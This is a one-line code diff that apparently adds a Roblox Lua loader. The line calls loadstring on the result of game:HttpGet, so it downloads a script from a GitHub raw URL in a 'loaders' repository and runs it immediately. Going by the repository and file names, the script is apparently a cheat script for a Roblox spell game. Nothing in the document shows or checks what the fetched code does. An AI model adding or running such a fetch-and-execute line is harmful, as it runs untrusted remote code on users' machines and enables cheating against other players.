@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/draw-spells-magic-arena-spam4-kn2ynq51ky52dg.lua"))()
